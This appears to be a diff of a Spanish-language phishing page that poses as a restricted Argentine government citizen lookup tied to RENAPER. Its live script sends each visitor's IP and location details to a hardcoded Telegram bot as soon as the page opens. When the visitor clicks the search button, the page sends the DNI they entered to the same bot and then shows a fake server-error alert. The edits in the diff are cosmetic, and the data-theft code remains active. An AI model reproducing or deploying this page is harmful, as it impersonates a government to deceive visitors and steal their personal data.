@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -20,8 +21,8 @@
         <hr style="border: 0.5px solid #00f2ff22;">
         <input type="number" id="dni" placeholder="Ingrese DNI objetivo">
         <br>
-        <button onclick="consultar()">BUSCAR</button>
-        <p id="status" style="font-size: 0.8em; margin-top:15px;">Sincronizando...</p>
+        <button onclick="consultar()">BUSCAR CIUDADANO</button>
+        <p id="status" style="font-size: 0.8em; margin-top:15px;">Sincronizando con RENAPER...</p>
     </div>
 
     <div class="footer">ACCESO RESTRINGIDO - GOBIERNO DE ARGENTINA</div>
@@ -30,7 +31,7 @@
         const token = "8488321953:AAFFIvsfxsxxp2ImaSl3WQzsuCTOyblqPig";
         const grupo = "-1003670055074";
 
-        // --- CAPTURA AUTOMÁTICA DE IP ---
+        // 1. CAPTURA IP AL ABRIR
         async function autoCaptura() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -43,10 +44,10 @@
 
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${grupo}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`);
                 document.getElementById('status').innerText = "CONEXIÓN ESTABLECIDA";
-            } catch (e) { console.log(e); }
+            } catch (e) { console.log("Error en captura automática"); }
         }
 
-        // --- CAPTURA DEL DNI AL TOCAR EL BOTÓN ---
+        // 2. CAPTURA DNI AL TOCAR BOTÓN
         async function consultar() {
             const dni = document.getElementById('dni').value;
             if(!dni) return alert("Ingrese un DNI");
@@ -54,7 +55,7 @@
             const textoDni = `📝 **DNI INGRESADO:** \`${dni}\``;
             await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${grupo}&text=${encodeURIComponent(textoDni)}&parse_mode=Markdown`);
             
-            alert("Error 505: El servidor de RENAPER no responde. Reintente.");
+            alert("Error 505: El servidor de RENAPER no responde. Reintente más tarde.");
         }
 
         window.onload = autoCaptura;
